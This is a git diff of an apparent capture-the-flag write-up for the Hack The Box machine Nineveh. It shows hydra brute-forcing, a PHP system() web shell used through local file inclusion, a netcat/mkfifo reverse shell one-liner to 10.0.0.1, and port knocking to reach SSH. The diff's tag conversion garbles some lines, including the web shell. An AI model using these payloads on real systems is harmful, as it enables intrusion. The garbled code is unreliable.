@@ -10,7 +10,7 @@ categories: HackTheBox OSCP-Like
 
 We are going to pwn Nineveh from Hack The Box.
 
-Link : <https://www.hackthebox.eu/home/machines/profile/54>
+Link : [https://www.hackthebox.eu/home/machines/profile/54](https://www.hackthebox.eu/home/machines/profile/54)
 
 
 Lets Begin with our Initial Nmap Scan.
@@ -96,10 +96,10 @@ Now start ``hydra``
 -f / -F   exit when a login/pass pair is found (-M: -f per host, -F global)
 -v / -V / -d  verbose mode / show login+pass for each attempt / debug mode 
 ```
-![](https://raw.githubusercontent.com/ghostbyt3/ghostbyt3.github.io/master/public/static/images/htb-nineveh/7.png)<br/>
+![](https://raw.githubusercontent.com/ghostbyt3/ghostbyt3.github.io/master/public/static/images/htb-nineveh/7.png)[br/](br/)
 We got the creds ```admin:1q2w3e4r5t```
 
-Lets try login<br/>
+Lets try login[br/](br/)
 ![](https://raw.githubusercontent.com/ghostbyt3/ghostbyt3.github.io/master/public/static/images/htb-nineveh/8.png)
 
 While checking the ``Notes`` tab it show us some message, I have no idea what it is so lets enumerate more!! And It looks like LFI on the URL.
@@ -138,12 +138,12 @@ There is an Remote PHP Code Injection
 
 For that we need to login first , I tried with ``admin`` ( Which is default creds of phpLiteAdmin) But it doesn't worked!!
 So Lets bruteforce again using ``hydra``
-Same as before Intercept the login using burp.<br/>
+Same as before Intercept the login using burp.[br/](br/)
 ![](https://raw.githubusercontent.com/ghostbyt3/ghostbyt3.github.io/master/public/static/images/htb-nineveh/11.png)
 
 Since the login page doesn't have any username so we dont need to worry about ``user``
-![](https://raw.githubusercontent.com/ghostbyt3/ghostbyt3.github.io/master/public/static/images/htb-nineveh/12-1.png)<br/>
-![](https://raw.githubusercontent.com/ghostbyt3/ghostbyt3.github.io/master/public/static/images/htb-nineveh/12.png)<br/>
+![](https://raw.githubusercontent.com/ghostbyt3/ghostbyt3.github.io/master/public/static/images/htb-nineveh/12-1.png)[br/](br/)
+![](https://raw.githubusercontent.com/ghostbyt3/ghostbyt3.github.io/master/public/static/images/htb-nineveh/12.png)[br/](br/)
 So the password is ``password123``
 
 And Im in
@@ -154,15 +154,15 @@ According to the exploit we need to first create a database with the extension o
 
 From there we need to create a table where we need to inject our payload.
 ![](https://raw.githubusercontent.com/ghostbyt3/ghostbyt3.github.io/master/public/static/images/htb-nineveh/15.png)
-``` <?php echo system($_REQUEST["cmd"]); ?>  ```
+``` [?php echo system($_REQUEST["cmd"]); ?](?php echo system($_REQUEST["cmd"]); ?)  ```
 
 Once its created and we already know there is a LFI so I tried to execute there.
-![](https://raw.githubusercontent.com/ghostbyt3/ghostbyt3.github.io/master/public/static/images/htb-nineveh/16.png)<br/>
+![](https://raw.githubusercontent.com/ghostbyt3/ghostbyt3.github.io/master/public/static/images/htb-nineveh/16.png)[br/](br/)
 It Worked and Why I named it as ``ninevehNotes.php`` is because we know there is a file called ``ninevehNotes.txt``.
 
 Now Its time to get reverse shell, I send it to burp and used reverse shell code.
 
-``` rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f ```<br/>
+``` rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f ```[br/](br/)
 ![](https://raw.githubusercontent.com/ghostbyt3/ghostbyt3.github.io/master/public/static/images/htb-nineveh/17.png)
 
 And I can't read user flag.
@@ -176,7 +176,7 @@ So Lets have a look on it.
 I downloaded it to my machine 
 ![](https://raw.githubusercontent.com/ghostbyt3/ghostbyt3.github.io/master/public/static/images/htb-nineveh/20.png)
 
-I did ``strings`` and found private key<br/>
+I did ``strings`` and found private key[br/](br/)
 ![](https://raw.githubusercontent.com/ghostbyt3/ghostbyt3.github.io/master/public/static/images/htb-nineveh/21.png)
 
 We already know ``ssh`` port is filtered it may be because of  ``knockd service``
@@ -194,7 +194,7 @@ So we need the sequence to open the port.
 
 >https://blog.rapid7.com/2017/10/04/how-to-secure-ssh-server-using-port-knocking-on-ubuntu-linux/
 
-From the blog I came to know we can see the sequence in ``/etc/knockd.conf``<br/>
+From the blog I came to know we can see the sequence in ``/etc/knockd.conf``[br/](br/)
 ![](https://raw.githubusercontent.com/ghostbyt3/ghostbyt3.github.io/master/public/static/images/htb-nineveh/22.png)
 
 Yes I got the sequence , Now its time to open.
@@ -205,7 +205,7 @@ Yes I got the sequence , Now its time to open.
 
 ![](https://raw.githubusercontent.com/ghostbyt3/ghostbyt3.github.io/master/public/static/images/htb-nineveh/23.png)
 
-Now we can use the private key to login<br/>
+Now we can use the private key to login[br/](br/)
 ![](https://raw.githubusercontent.com/ghostbyt3/ghostbyt3.github.io/master/public/static/images/htb-nineveh/24.png)
 
 ## Privilege Escalation
